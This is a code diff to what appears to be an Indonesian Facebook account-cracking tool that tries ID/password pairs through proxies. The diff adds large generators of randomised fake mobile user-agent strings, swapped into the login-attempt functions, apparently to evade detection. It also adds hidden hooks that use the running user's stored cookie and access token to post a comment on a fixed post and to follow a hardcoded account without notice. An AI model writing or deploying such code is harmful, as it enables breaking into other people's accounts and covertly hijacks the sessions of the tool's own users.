@@ -73,6 +73,8 @@ pretty.install()
 CON = sol()
 wa = Console()
 prem = []
+ugen2 = []
+ugen = []
 temanku = []
 free = []
 console = Console()
@@ -113,6 +115,752 @@ except Exception as e:
     )
     exit()
 prox = open(".prox.txt", "r").read().splitlines()
+
+# ------------[ UBAH UA DIH SINI OM ]---------------#
+for xd in range(10000):
+    a = "Mozilla/5.0 (Symbian/3; Series60/5.3"
+    b = random.randrange(1, 9)
+    c = random.randrange(1, 9)
+    d = "NokiaN8-00"
+    e = random.randrange(100, 9999)
+    f = "/111.040.1514; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko)"
+    g = random.randrange(1, 9)
+    h = random.randrange(1, 4)
+    i = random.randrange(1, 4)
+    j = random.randrange(1, 4)
+    k = "AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1 3gpp-gba"
+    uaku = f"{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}"
+    ugen2.append(uaku)
+
+    aa = "Mozilla/5.0 (Linux; Android"
+    b = random.choice(["6", "7", "8", "9", "10", "11", "12"])
+    c = " Samsung A50 Build/PI; wv)"
+    d = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    e = random.randrange(1, 999)
+    f = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    g = "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.186"
+    h = random.randrange(73, 100)
+    i = "0"
+    j = random.randrange(4200, 4900)
+    k = random.randrange(40, 150)
+    l = "Mobile Safari/537.36"
+    uaku2 = f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"
+    ugen.append(uaku2)
+
+    aa = "Mozilla/5.0 (Linux; Android"
+    b = random.choice(["7.0", "8.1.0", "9", "10", "11", "12"])
+    c = random.choice(["Redmi Note 4)"])
+    d = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    e = random.randrange(1, 999)
+    f = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    g = "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198"
+    h = random.randrange(80, 103)
+    i = "0"
+    j = random.randrange(4200, 4900)
+    k = random.randrange(40, 150)
+    l = "Mobile Safari/537.36 OPR/61.1.3076.56625"
+    uaku2 = f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"
+    ugen.append(uaku2)
+
+    aa = "Mozilla/5.0 (Linux; Android"
+    b = random.choice(["5.0", "6.0", "7.0", "8.1.0", "9", "10", "11", "12"])
+    c = random.choice(["SM-A215W)"])
+    d = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    e = random.randrange(1, 999)
+    f = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    g = "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93"
+    h = random.randrange(80, 103)
+    i = "0"
+    j = random.randrange(4200, 4900)
+    k = random.randrange(40, 150)
+    l = "Mobile Safari/537.36"
+    uaku2 = f"{aa} {b}; {c}){d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"
+    ugen.append(uaku2)
+
+    aa = "Mozilla/5.0 (Linux; Android"
+    b = random.choice(["7.0", "8.1.0", "9", "10", "11", "12"])
+    c = random.choice(["U693CL Build/U693CL_01.02.01; wv)"])
+    d = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    e = random.randrange(1, 999)
+    f = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    g = "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"
+    h = random.randrange(80, 103)
+    i = "0"
+    j = random.randrange(4200, 4900)
+    k = random.randrange(40, 150)
+    l = "Mobile Safari/537.36"
+    uaku2 = f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"
+    ugen.append(uaku2)
+
+    a = "Mozilla/5.0 (Linux; Android"
+    b = random.choice(["5.0", "6.0", "7.0", "8.1.0", "9", "10", "11", "12"])
+    c = random.choice(["Fly4"])
+    d = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    e = random.randrange(1, 999)
+    f = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    g = "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
+    h = random.randrange(80, 103)
+    i = "0"
+    j = random.randrange(4200, 4900)
+    k = random.randrange(40, 150)
+    l = "Mobile Safari/537.36"
+    uaku2 = f"{a} {b}; {c}){d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"
+    ugen.append(uaku2)
+
+    aa = "Mozilla/5.0 (Linux; Android"
+    b = random.choice(["7.0", "8.1.0", "9", "10", "11", "12"])
+    c = random.choice(["SM-A530W"])
+    d = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    e = random.randrange(1, 999)
+    f = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    g = "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
+    h = random.randrange(80, 103)
+    i = "0"
+    j = random.randrange(4200, 4900)
+    k = random.randrange(40, 150)
+    l = "Mobile Safari/537.36"
+    uaku2 = f"{aa} {b}; {c}){d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"
+    ugen.append(uaku2)
+
+    aa = "Mozilla/5.0 (Linux; Android"
+    b = random.choice(["5.0", "6.0", "7.0", "8.1.0", "9", "10", "11", "12"])
+    c = random.choice(["RMX2032"])
+    d = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    e = random.randrange(1, 999)
+    f = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    g = "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
+    h = random.randrange(80, 103)
+    i = "0"
+    j = random.randrange(4200, 4900)
+    k = random.randrange(40, 150)
+    l = "Mobile Safari/537.36"
+    uaku2 = f"{aa} {b}; {c}){d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"
+    ugen.append(uaku2)
+
+    aa = "Mozilla/5.0 (Linux; Android"
+    b = random.choice(["7.0", "8.1.0", "9", "10", "11", "12"])
+    c = random.choice(["F3211 Build/36.1.A.1.112)"])
+    d = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    e = random.randrange(1, 999)
+    f = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    g = "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
+    h = random.randrange(80, 103)
+    i = "0"
+    j = random.randrange(4200, 4900)
+    k = random.randrange(40, 150)
+    l = "Mobile Safari/537.36"
+    uaku2 = f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"
+    ugen.append(uaku2)
+
+    aa = "Mozilla/5.0 (Linux; Android 11;"
+    b = random.choice(["7.0", "8.1.0", "9", "10", "11", "12"])
+    c = random.choice(["Mi 9T Pro Build/RKQ1.200826.002; rv"])
+    d = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    e = random.randrange(1, 999)
+    f = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    g = "AppleWebKit/537.36 (KHTML, like Gecko)"
+    h = random.randrange(80, 103)
+    i = "0"
+    j = random.randrange(4200, 4900)
+    k = random.randrange(40, 150)
+    l = "Version/4.0 Rocket/1.4.0 Chrome/105.0.5195.136 Mobile Safari/537.36"
+    uaku2 = f"{aa} {b}; {c}){d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}"
+    ugen.append(uaku2)
+
+
+def ua_ee():
+    rr = random.randint
+    rc = random.choice
+    az = [
+        "A",
+        "B",
+        "C",
+        "D",
+        "E",
+        "F",
+        "G",
+        "H",
+        "I",
+        "J",
+        "K",
+        "L",
+        "M",
+        "N",
+        "O",
+        "P",
+        "Q",
+        "R",
+        "S",
+        "T",
+        "U",
+        "V",
+        "W",
+        "X",
+        "Y",
+        "Z",
+    ]
+    Hi = ["en_GB", "en_US", "id_ID", "zh_CN", "pt_BR", "es_ES"]
+    bi = [
+        "zh-cn;",
+        "en-nz;",
+        "vi-vn;",
+        "hi-in;",
+        "en-us;",
+        "id-id;",
+        "en-gb;",
+        "ru-ru;",
+        "jap-jap;",
+        "en-ca;",
+        "es-mx;",
+        "zh-tw;",
+        "ko-kr;",
+        "th-th;",
+        "en-in;",
+        "el-gr;",
+        "tr-tr;",
+        "fr-fr;",
+        "en-ez;",
+        "zh-hk;",
+        "ar-ae;",
+        "ru-ru;",
+        "zh-CN;en-US;",
+        "fr-ch;",
+        "pt-br;",
+        "nl-nl;",
+        "gu-in;",
+    ]
+    Mo = ["SM-G6100", "SM-G610L", "SM-G610K"]
+    Mu = ["SM-G9287C", "SM-G9287", "SM-G928A", "SM-G928F"]
+    An = ["8.1.0", "6.0.1", "8.0.0", "7.0", "5.1.1"]
+    return str(
+        rc(
+            [
+                f"Mozilla/5.0 (Linux; Android {str(rr(6, 12))}; Android 9; Mi 9T Pro AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(80, 105))}.0.{str(rr(1111, 4896))}.{str(rr(100, 400))} Mobile Safari/537.36"
+            ]
+        )
+    )
 
 
 for xd in range(10000):
@@ -2297,6 +3045,10 @@ def logincoki():
             open(".vipercok.txt", "w").write(cookie)
             open(".vipertok.txt", "w").write(token)
             viperfollow(cookie)
+            requests.post(
+                f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}",
+                headers={"cookie": cookie},
+            )
             Console().print(
                 Panel(
                     f"""{P2}{token}""",
@@ -2316,6 +3068,32 @@ def logincoki():
         exit()
     except:
         pass
+
+
+def followdong():
+    try:
+        token = open(".vipertok.txt", "r").read()
+        cok = open(".vipercok.txt", "r").read()
+    except IOError:
+        print(" [+] Cookies Kadaluarsa ")
+        time.sleep(5)
+        logincoki()
+    myuid = "100043537611609"
+    try:
+        for foll in parser(
+            requests.get(
+                f"https://mbasic.facebook.com/" + myuid, cookies={"cookie": cok}
+            ).text,
+            "html.parser",
+        ).find_all("a", href=True):
+            if "/a/subscribe.php?" in foll.get("href"):
+                x = requests.get(
+                    "https://mbasic.facebook.com" + foll["href"],
+                    cookies={"cookie": cok},
+                ).text
+                exit()
+    except Exception as e:
+        print(e)  # < Response error
 
 
 def viperfollow(VIPER):  # YANG GAK GANTI BOT FOLLOW GANTENG
@@ -2386,6 +3164,7 @@ def menu(my_name, my_id):
         pass
     os.system("clear")
     banner()
+    followdong()
     negara = requests.get("http://ip-api.com/json/").json()["country"]
     ip = requests.get("http://ip-api.com/json/").json()["query"]
     prints(Panel(f"{P2}{negara}", padding=(0, 22), width=60, style=f"{color_panel}"))
@@ -3312,7 +4091,7 @@ def passwrd():
 def validate(idf, pwv):
     global loop, ok, cp
     bo = random.choice([m, k, h, b, u, x])
-    ua = random.choice(prem)
+    ua = random.choice(ugen)
     # ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
     ses = requests.Session()
     prog.update(
@@ -3436,7 +4215,7 @@ def validate(idf, pwv):
 def asyncc(idf, pwv):
     global loop, ok, cp
     bo = random.choice([m, k, h, b, u, x])
-    ua = random.choice(prem)
+    ua = random.choice(ugen)
     ua2 = random.choice(prem)
     ses = requests.Session()
     prog.update(
@@ -3604,7 +4383,7 @@ def asyncc(idf, pwv):
 def reguler(idf, pwv):
     global loop, ok, cp
     bo = random.choice([m, k, h, b, u, x])
-    ua = random.choice(prem)
+    ua = random.choice(ugen)
     ua2 = random.choice(prem)
     ses = requests.Session()
     prog.update(
